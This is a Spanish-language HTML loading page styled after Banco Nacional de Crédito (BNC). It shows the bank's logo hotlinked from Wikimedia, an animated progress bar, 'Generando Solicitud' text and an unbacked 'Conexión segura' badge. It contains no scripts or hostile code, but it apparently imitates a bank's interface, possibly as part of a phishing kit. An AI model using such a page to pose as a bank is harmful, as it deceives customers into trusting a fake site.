<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="iconero.ico" type="image/x-icon" sizes="256x256"/>
    <title>BNC</title>

    <!-- Tipografía geométrica de marca -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,500;0,600;0,700;1,800&display=swap" rel="stylesheet">

    <style>
        :root {
            --bnc-navy: #062E5C;
            --bnc-navy-deep: #04162c;
            --bnc-navy-black: #02101f;
            --bnc-orange: #FF6A00;
            --bnc-amber: #F0AD4E;
            --bnc-green: #00A651;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        html, body {
            height: 100%;
            width: 100%;
        }

        body {
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Montserrat', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background:
                radial-gradient(120% 80% at 50% -10%, rgba(255, 106, 0, 0.13) 0%, rgba(255, 106, 0, 0) 55%),
                radial-gradient(90% 60% at 100% 110%, rgba(0, 166, 81, 0.10) 0%, rgba(0, 166, 81, 0) 60%),
                linear-gradient(160deg, var(--bnc-navy-deep) 0%, var(--bnc-navy) 52%, var(--bnc-navy-black) 100%);
            overflow: hidden;
        }

        /* CONTENEDOR PRINCIPAL */
        .container {
            text-align: center;
            max-width: 420px;
            width: 100%;
            padding: 20px;
        }

        /* CARD */
        .card {
            position: relative;
            background: rgba(255, 255, 255, 0.035);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 106, 0, 0.16);
            border-radius: 12px;
            padding: 48px 40px;
            box-shadow: 0 20px 55px rgba(2, 16, 31, 0.55);
            animation: slideUp 0.7s cubic-bezier(0.34, 1.56, 0.64, 1);
            overflow: hidden;
        }

        /* FILO SUPERIOR DE MARCA */
        .card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 3px;
            background: linear-gradient(90deg, var(--bnc-orange) 0%, var(--bnc-amber) 52%, var(--bnc-green) 100%);
        }

        /* LOGO */
        .logo-wrapper {
            margin-bottom: 32px;
        }

        .logo {
            width: 78px;
            height: 78px;
            margin: 0 auto;
            border-radius: 10px;
            overflow: hidden;
            background: #ffffff;
            border: 1px solid rgba(255, 255, 255, 0.25);
            display: flex;
            align-items: center;
            justify-content: center;
            animation: fadeInScale 0.8s ease-out 0.1s both;
            box-shadow: 0 10px 26px rgba(2, 16, 31, 0.45);
        }

        .logo img {
    width: 100%;
    height: 100%;
    object-fit: contain;
    padding: 8px;
    display: block;
}

        /* INDICADOR DE CARGA */
        .loader {
            margin-bottom: 32px;
            height: 4px;
            background: rgba(255, 255, 255, 0.08);
            border-radius: 2px;
            overflow: hidden;
            position: relative;
        }

        .loader::after {
            content: '';
            position: absolute;
            left: 0;
            top: 0;
            height: 100%;
            width: 34%;
            background: linear-gradient(90deg,
                rgba(255, 106, 0, 0) 0%,
                rgba(255, 106, 0, 0.95) 55%,
                rgba(240, 173, 78, 0) 100%);
            animation: loading 1.8s ease-in-out infinite;
        }

        /* TEXTO PRINCIPAL */
        .status-text {
            font-size: 15px;
            color: rgba(255, 255, 255, 0.92);
            font-weight: 600;
            letter-spacing: 0.3px;
            margin-bottom: 8px;
            animation: fadeIn 0.8s ease-out 0.2s both;
        }

        .status-dots {
            display: inline-block;
            width: 14px;
            text-align: left;
            color: var(--bnc-amber);
            animation: dots 1.4s steps(4, end) infinite;
        }

        /* INFORMACIÓN DE SEGURIDAD */
        .security-info {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            margin-top: 24px;
            padding-top: 20px;
            border-top: 1px solid rgba(255, 255, 255, 0.07);
            font-size: 12px;
            font-weight: 500;
            letter-spacing: 0.2px;
            color: rgba(255, 255, 255, 0.62);
            animation: fadeIn 0.8s ease-out 0.4s both;
        }

        .security-icon {
            width: 14px;
            height: 14px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .lock-icon {
            width: 10px;
            height: 12px;
            border: 1.5px solid rgba(255, 106, 0, 0.85);
            border-radius: 2px;
            position: relative;
        }

        .lock-icon::before {
            content: '';
            position: absolute;
            top: -5px;
            left: 50%;
            transform: translateX(-50%);
            width: 6px;
            height: 5px;
            border: 1.5px solid rgba(255, 106, 0, 0.85);
            border-bottom: none;
            border-radius: 6px 6px 0 0;
        }

        /* ANIMACIONES */
        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        @keyframes fadeInScale {
            from {
                opacity: 0;
                transform: scale(0.95);
            }
            to {
                opacity: 1;
                transform: scale(1);
            }
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
            }
            to {
                opacity: 1;
            }
        }

        @keyframes loading {
            0% {
                left: -100%;
            }
            100% {
                left: 100%;
            }
        }

        @keyframes dots {
            0% { content: ''; }
            33% { content: '.'; }
            66% { content: '..'; }
            100% { content: '...'; }
        }

        /* RESPONSIVE */
        @media (max-width: 480px) {
            .card {
                padding: 36px 24px;
            }

            .status-text {
                font-size: 14px;
            }

            .logo {
                width: 70px;
                height: 70px;
            }
        }

        /* PREFERS REDUCED MOTION */
        @media (prefers-reduced-motion: reduce) {
            * {
                animation-duration: 0.01ms !important;
                animation-iteration-count: 1 !important;
                transition-duration: 0.01ms !important;
            }
        }
    </style>
</head>

<body>

    <div class="container">
        <div class="card">
            <div class="logo-wrapper">
                <div class="logo">
                <img src="https://upload.wikimedia.org/wikipedia/commons/8/84/Banco_Nacional_de_Credito.png?utm_source=es.wikipedia.org&utm_campaign=index&utm_content=original" alt="BNC">
            </div>
            </div>

            <div class="loader"></div>

            <div class="status-text">
                Generando Solicitud<span class="status-dots"></span>
            </div>

            <div class="security-info">
                <div class="security-icon">
                    <div class="lock-icon"></div>
                </div>
                <span>Conexión segura</span>
            </div>
        </div>
    </div>
